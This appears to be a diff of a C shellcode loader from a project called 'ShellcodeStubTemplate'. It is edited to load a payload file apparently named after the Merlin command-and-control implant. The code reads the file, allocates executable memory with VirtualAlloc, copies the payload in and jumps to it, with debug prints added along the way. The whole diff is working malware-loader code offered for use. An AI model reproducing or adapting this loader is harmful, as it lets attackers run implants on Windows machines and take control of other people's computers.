@@ -36,7 +36,7 @@ int main(int argc, char **argv) {
 
  
 unsigned char abc[256]="";
-const char* filename = "enc_shellcode.bin";
+const char* filename = "C:\\Users\\Antoine\\source\\repos\\ShellcodeStubTemplate\\enc_merlin1705";
 
 FILE* in_file = fopen(filename, "rb");
     if (!in_file) {
@@ -54,14 +54,16 @@ FILE* in_file = fopen(filename, "rb");
     char* file_contents = malloc(sb.st_size);
     fread(file_contents, sb.st_size, 1, in_file);
 
-    print_hex(file_contents);
+ //   print_hex(file_contents);
  
     fclose(in_file);
 
-printf("for debug");
-void *exec = VirtualAlloc(0, sb.st_size+3, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-memcpy(exec, file_contents, sb.st_size+1);
+printf("for debug1");
+void *exec = VirtualAlloc(0, sb.st_size+100, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+printf("for debug2");
+memcpy(exec, file_contents, sb.st_size);
 
+printf("for debug3");
 ((void(*)())exec)();
 return 0;
 
